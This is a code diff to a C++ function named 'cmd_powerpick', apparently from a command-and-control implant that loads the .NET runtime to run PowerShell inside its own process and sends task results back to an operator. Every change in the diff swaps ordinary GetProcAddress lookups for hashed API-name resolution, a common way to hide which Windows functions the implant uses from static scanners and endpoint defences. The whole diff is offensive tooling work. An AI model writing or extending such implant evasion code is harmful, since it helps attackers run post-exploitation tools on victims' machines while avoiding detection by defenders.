@@ -206,21 +206,21 @@ auto declfn starburst::cmd_powerpick(
     }
 
     auto pSafeArrayCreate = reinterpret_cast<fn_SafeArrayCreate>(
-        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayCreate" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ), expr::hash_string( "SafeArrayCreate" ) ) );
     auto pSafeArrayAccessData = reinterpret_cast<fn_SafeArrayAccessData>(
-        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayAccessData" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ), expr::hash_string( "SafeArrayAccessData" ) ) );
     auto pSafeArrayUnaccessData = reinterpret_cast<fn_SafeArrayUnaccessData>(
-        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayUnaccessData" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ), expr::hash_string( "SafeArrayUnaccessData" ) ) );
     auto pSafeArrayDestroy = reinterpret_cast<fn_SafeArrayDestroy>(
-        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayDestroy" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ), expr::hash_string( "SafeArrayDestroy" ) ) );
     auto pSafeArrayCreateVector = reinterpret_cast<fn_SafeArrayCreateVector>(
-        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayCreateVector" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ), expr::hash_string( "SafeArrayCreateVector" ) ) );
     auto pSafeArrayPutElement = reinterpret_cast<fn_SafeArrayPutElement>(
-        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayPutElement" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ), expr::hash_string( "SafeArrayPutElement" ) ) );
     auto pSysAllocString = reinterpret_cast<fn_SysAllocString>(
-        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SysAllocString" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ), expr::hash_string( "SysAllocString" ) ) );
     auto pSysFreeString = reinterpret_cast<fn_SysFreeString>(
-        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SysFreeString" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ), expr::hash_string( "SysFreeString" ) ) );
 
     if ( !pSafeArrayCreate || !pSafeArrayAccessData || !pSafeArrayDestroy ||
          !pSafeArrayCreateVector || !pSafeArrayPutElement || !pSysAllocString ) {
@@ -230,8 +230,8 @@ auto declfn starburst::cmd_powerpick(
     }
 
     auto pSetStdHandle = reinterpret_cast<fn_SetStdHandle>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "SetStdHandle" ) ) );
+        resolve::_api(
+            reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ), expr::hash_string( "SetStdHandle" ) ) );
 
     if ( !inst.powerpick.stdout_redirected ) {
         SECURITY_ATTRIBUTES sa_pipe = {};
@@ -259,8 +259,8 @@ auto declfn starburst::cmd_powerpick(
     }
 
     auto pCLRCreateInstance = reinterpret_cast<fn_CLRCreateInstance>(
-        inst.kernel32.GetProcAddress( h_mscoree,
-            symbol<LPCSTR>( "CLRCreateInstance" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_mscoree ),
+            expr::hash_string( "CLRCreateInstance" ) ) );
 
     if ( !pCLRCreateInstance ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
